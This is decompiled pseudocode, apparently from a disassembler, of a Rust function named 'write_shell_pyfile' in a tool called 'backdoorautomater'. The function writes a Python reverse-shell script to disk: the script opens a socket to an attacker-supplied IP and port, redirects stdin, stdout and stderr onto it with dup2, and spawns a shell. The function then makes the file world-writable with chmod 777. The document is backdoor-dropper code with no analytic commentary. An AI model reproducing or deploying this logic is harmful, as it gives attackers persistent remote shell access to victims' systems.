__int64 __fastcall backdoorautomater::cronshell::write_shell_pyfile(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v4; // r12
  __int128 v5; // xmm0
  __int128 v6; // xmm0
  __int128 v8; // xmm0
  __int64 v9; // rax
  __int64 v10; // rax
  __int64 v11; // rax
  unsigned int v12; // [rsp+Ch] [rbp-1ECh] BYREF
  __int128 v13; // [rsp+10h] [rbp-1E8h] BYREF
  __int64 v14; // [rsp+20h] [rbp-1D8h]
  __int128 v15; // [rsp+30h] [rbp-1C8h] BYREF
  __int64 v16; // [rsp+40h] [rbp-1B8h]
  __int128 v17; // [rsp+50h] [rbp-1A8h] BYREF
  __int64 v18; // [rsp+60h] [rbp-198h]
  __int128 v19; // [rsp+90h] [rbp-168h]
  __int64 v20; // [rsp+A0h] [rbp-158h]
  __int128 v21; // [rsp+B0h] [rbp-148h] BYREF
  __int64 v22; // [rsp+C0h] [rbp-138h]
  __int128 v23; // [rsp+C8h] [rbp-130h] BYREF
  __int128 v24; // [rsp+D8h] [rbp-120h]
  _BYTE v25[32]; // [rsp+198h] [rbp-60h] BYREF
  __int64 v26; // [rsp+1B8h] [rbp-40h]
  __int64 v27; // [rsp+1C0h] [rbp-38h]

  std::fs::File::create(&v23, a3);
  if ( (_DWORD)v23 )
  {
    v4 = *((_QWORD *)&v23 + 1);
  }
  else
  {
    v12 = DWORD1(v23);
    v4 = std::io::Write::write_all(&v12, aImportSocketSu_2, 29LL);
    if ( !v4 )
    {
      v4 = std::io::Write::write_all(&v12, aSSocketSocketS_2, 52LL);
      if ( !v4 )
      {
        v5 = *(_OWORD *)(a2 + 8);
        *(_QWORD *)&v23 = aVIp_2;
        *((_QWORD *)&v23 + 1) = 6LL;
        v24 = v5;
        alloc::str::join_generic_copy(&v17, &v23, 2LL, 1LL, 0LL);
        v14 = v18;
        v13 = v17;
        alloc::vec::Vec<T,A>::extend_from_slice(&v13, asc_167259, 3LL);
        v4 = std::io::Write::write_all(&v12, *((_QWORD *)&v13 + 1), v14);
        if ( !v4 )
        {
          v6 = *(_OWORD *)(a1 + 8);
          *(_QWORD *)&v23 = aSConnectVIp_0;
          *((_QWORD *)&v23 + 1) = 16LL;
          v24 = v6;
          alloc::str::join_generic_copy(&v17, &v23, 2LL, 1LL, 0LL);
          v16 = v18;
          v15 = v17;
          alloc::vec::Vec<T,A>::extend_from_slice(&v15, asc_165A9F, 4LL);
          v4 = std::io::Write::write_all(&v12, *((_QWORD *)&v15 + 1), v16);
          if ( !v4 )
          {
            v4 = std::io::Write::write_all(&v12, aOsDup2SFileno0_2, 23LL);
            if ( !v4 )
            {
              v4 = std::io::Write::write_all(&v12, aOsDup2SFileno1_2, 23LL);
              if ( !v4 )
              {
                v4 = std::io::Write::write_all(&v12, aOsDup2SFileno2_2, 23LL);
                if ( !v4 )
                {
                  v4 = std::io::Write::write_all(&v12, aVShellPathUsrB_2, 30LL);
                  if ( !v4 )
                  {
                    v4 = std::io::Write::write_all(&v12, aVShellValueI_2, 20LL);
                    if ( !v4 )
                    {
                      v4 = std::io::Write::write_all(&v12, aPSubprocessCal_2, 49LL);
                      if ( !v4 )
                      {
                        v8 = *(_OWORD *)(a3 + 8);
                        *(_QWORD *)&v23 = aChmod777_2;
                        *((_QWORD *)&v23 + 1) = 10LL;
                        v24 = v8;
                        alloc::str::join_generic_copy(&v17, &v23, 2LL, 1LL, 0LL);
                        v20 = v18;
                        v19 = v17;
                        std::process::Command::new(&v23, aSh_3, 2LL);
                        v9 = std::process::Command::arg(&v23, aC_5, 2LL);
                        v18 = v20;
                        v17 = v19;
                        v10 = std::process::Command::arg(v9, &v17);
                        std::process::Command::output(&v17, v10);
                        core::result::Result<T,E>::expect(v25, &v17, &off_22A968);
                        core::ptr::drop_in_place<std::process::Command>(&v23);
                        alloc::string::String::from_utf8_lossy(&v17, v26, v27);
                        v11 = <alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v17);
                        <T as alloc::slice::hack::ConvertVec>::to_vec(&v23, v11);
                        v22 = v24;
                        v21 = v23;
                        core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v17);
                        backdoorautomater::sanitizer::sanitize_system_command((__int64)&v21);
                        core::ptr::drop_in_place<alloc::string::String>(&v21);
                        core::ptr::drop_in_place<std::process::Output>(v25);
                        core::ptr::drop_in_place<alloc::string::String>(&v15);
                        core::ptr::drop_in_place<alloc::string::String>(&v13);
                        core::ptr::drop_in_place<std::fs::File>(v12);
                        core::ptr::drop_in_place<alloc::string::String>(a3);
                        core::ptr::drop_in_place<alloc::string::String>(a2);
                        v4 = 0LL;
                        goto LABEL_17;
                      }
                    }
                  }
                }
              }
            }
          }
          core::ptr::drop_in_place<alloc::string::String>(&v15);
        }
        core::ptr::drop_in_place<alloc::string::String>(&v13);
      }
    }
    core::ptr::drop_in_place<std::fs::File>(v12);
  }
  core::ptr::drop_in_place<alloc::string::String>(a3);
  core::ptr::drop_in_place<alloc::string::String>(a2);
LABEL_17:
  core::ptr::drop_in_place<alloc::string::String>(a1);
  return v4;
}